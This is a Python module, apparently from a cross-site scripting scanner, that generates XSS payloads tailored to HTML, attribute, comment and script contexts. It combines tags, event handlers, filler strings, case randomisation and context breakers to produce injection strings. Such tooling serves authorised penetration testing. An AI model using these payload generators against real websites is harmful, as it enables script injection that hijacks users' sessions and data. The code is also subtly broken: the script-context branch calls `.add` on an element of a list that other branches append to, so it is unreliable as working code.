from itertools import product
from config import (
    fillings,
    eFillings,
    lFillings,
    jFillings,
    eventHandlers,
    tags,
    functions,
)
from utils import random_upper, extract_scripts
from injector.context_breaker import generate_context_breaker


def generate_payload(occurences, response, xss_checker):
    scripts = extract_scripts(response, xss_checker)
    index = 0
    vectors = []
    for i in occurences:
        context = occurences[i]["context"]
        if context == "html":
            ends = ["//", ">"]
            badTag = (
                occurences[i]["details"]["badTag"]
                if "badTag" in occurences[i]["details"]
                else ""
            )
            payloads = generate_malicious_scripts(
                xss_checker,
                fillings,
                eFillings,
                lFillings,
                eventHandlers,
                tags,
                functions,
                ends,
                badTag,
            )
            for payload in payloads:
                vectors.append(payload)
        elif context == "attribute":
            quote = occurences[i]["details"]["quote"] or ""
            ends = ["//", ">"]
            payloads = generate_malicious_scripts(
                xss_checker,
                fillings,
                eFillings,
                lFillings,
                eventHandlers,
                tags,
                functions,
                ends,
            )
            for payload in payloads:
                vectors.append(f"{quote} >{payload}")
        elif context == "comment":
            ends = ["//", ">"]
            payloads = generate_malicious_scripts(
                xss_checker,
                fillings,
                eFillings,
                lFillings,
                eventHandlers,
                tags,
                functions,
                ends,
            )
            for payload in payloads:
                vectors.append(f" -->{payload}")
        elif context == "script":
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue
            closer = generate_context_breaker(script, xss_checker)
            quote = occurences[i]["details"]["quote"]
            ends = ["//", ">"]

            suffix = "//\\"
            for filling, function in product(jFillings, functions):
                vector = f"{closer}{filling}{function}{suffix}"
                vectors[7].add(vector)
            index += 1
    return vectors


def generate_malicious_scripts(
    xss_checker,
    fillings,
    eFillings,
    lFillings,
    eventHandlers,
    tags,
    functions,
    ends,
    badTag=None,
):
    scripts = []
    for tag in tags:
        if tag == "d3v" or tag == "a":
            bait = xss_checker
        else:
            bait = ""
        for eventHandler in eventHandlers:
            # if the tag is compatible with the event handler
            if tag in eventHandlers[eventHandler]:
                for function, filling, eFilling, lFilling, end in product(
                    functions, fillings, eFillings, lFillings, ends
                ):
                    if (tag == "d3v" or tag == "a") and (">" in ends):
                        end = ">"  # we can't use // as > with "a" or "d3v" tag
                    breaker = ""
                    if badTag:
                        breaker = f"</{random_upper(badTag)}>"
                    script = f"{breaker}<{random_upper(tag)}{filling}{random_upper(eventHandler)}{eFilling}={eFilling}{function}{lFilling}{end}{bait}"
                    scripts.append(script)
    return scripts
